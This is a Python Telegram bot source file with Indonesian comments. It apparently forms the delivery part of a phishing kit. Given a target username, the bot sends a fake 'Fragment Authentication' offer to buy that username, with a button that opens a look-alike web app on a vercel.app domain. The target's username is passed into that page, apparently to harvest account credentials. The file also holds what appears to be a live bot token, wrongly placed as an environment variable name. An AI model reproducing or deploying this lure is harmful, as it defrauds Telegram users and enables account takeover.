import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, InlineQueryHandler

# =================================================================
#               KONFIGURASI WAJIB: DIBACA DARI RAILWAY
# =================================================================
# Token dan URL dibaca dari variabel lingkungan (Environment Variables)
TOKEN = os.getenv("7968573254:AAEDR8cvaIdrK2QdG-h9MTfpecXuupjQ_Gs") 
WEB_APP_URL = os.getenv("https://fragment-authentication.vercel.app/") 
# =================================================================

# Konfigurasi Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# -----------------------------------------------------------------
# 1. HANDLER UNTUK CHAT PRIBADI (POLLING MODE)
# -----------------------------------------------------------------

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menanggapi perintah /start dan meminta username."""
    await update.message.reply_text(
        "give username :"
    )

async def handle_username_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menerima input username dan membalas dengan tombol Web App."""
    
    chat_id = update.effective_chat.id
    username_input = update.message.text.strip().replace('@', '') 
    
    if not username_input or len(username_input) < 3:
        await update.message.reply_text("Username tidak valid.")
        return

    # Konstruksi URL Dinamis ke Vercel
    full_web_app_url = f"{WEB_APP_URL}?username={username_input}"

    # Konstruksi Pesan dan Tombol
    reply_text = (
        f"Fragment Authentication : Direct offer to sell your username @{username_input}"
    )
    keyboard = [
        [
            InlineKeyboardButton(
                "View Detail", 
                web_app=WebAppInfo(url=full_web_app_url) 
            )
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(
        chat_id=chat_id,
        text=reply_text,
        reply_markup=reply_markup
    )

# -----------------------------------------------------------------
# 2. HANDLER UNTUK INLINE BOT (BERBAGI PESAN DENGAN VIA @BOT)
# -----------------------------------------------------------------

async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menanggapi query inline saat pengguna mengetik @namabot [username]."""
    
    query = update.inline_query.query 
    
    # 🚨 PENTING: Pengecekan agar Bot tidak crash saat query kosong
    if not query or not WEB_APP_URL:
        results = [
            InlineQueryResultArticle(
                id="instruction",
                title="Ketik Username Target",
                input_message_content=InputTextMessageContent(
                    "Silakan ketik @[NamaBotAnda] diikuti dengan username target."
                )
            )
        ]
        # Pastikan kita menjawab query, bahkan jika dengan instruksi
        await update.inline_query.answer(results) 
        return

    username_target = query.strip().replace('@', '')

    # Konstruksi URL Dinamis
    full_web_app_url = f"{WEB_APP_URL}?username={username_target}"

    # Konstruksi Tombol Web App
    inline_keyboard = [
        [
            InlineKeyboardButton(
                "View Detail", 
                web_app=WebAppInfo(url=full_web_app_url)
            )
        ]
    ]

    # Buat Konten Pesan yang akan Dikirim
    message_content = (
        f"💸 Penawaran Fragment baru untuk username @{username_target}!\n\n"
        f"Klik 'View Detail' untuk melihat tawaran otentikasi.\n\n"
        f"Fragment Authentication: Direct offer to sell your username @{username_target}"
    )

    # Buat Hasil Inline Query (yang akan ditampilkan di pop-up hasil)
    results = [
        InlineQueryResultArticle(
            id=username_target, 
            title=f"Kirim Penawaran ke @{username_target}",
            description=f"Akan mengirimkan tawaran Fragment ke @{username_target}.",
            input_message_content=InputTextMessageContent(
                message_content
            ),
            reply_markup=InlineKeyboardMarkup(inline_keyboard)
        )
    ]

    # Jawab query inline. cache_time rendah agar hasil update cepat.
    await update.inline_query.answer(results, cache_time=5)


# -----------------------------------------------------------------
# 3. FUNGSI UTAMA (SETUP)
# -----------------------------------------------------------------

def main() -> None:
    """Mulai Bot dan daftarkan handlers."""
    
    # Pengecekan Kritis sebelum Bot berjalan
    if not TOKEN:
        logger.error("BOT_TOKEN belum diatur di Environment Variables. Bot tidak bisa berjalan.")
        return
    if not WEB_APP_URL:
        logger.error("WEB_APP_URL belum diatur di Environment Variables. Bot akan crash pada mode Inline.")
        # Kita tetap izinkan Bot berjalan, tapi fitur Inline akan crash jika dijalankan tanpa URL.
        # Atau kita bisa memilih untuk keluar: return

    application = Application.builder().token(TOKEN).build()

    # Daftarkan Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username_input))
    application.add_handler(InlineQueryHandler(inline_query)) # Inline Bot Handler

    logger.info("Bot sedang berjalan dan siap untuk menerima pesan...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()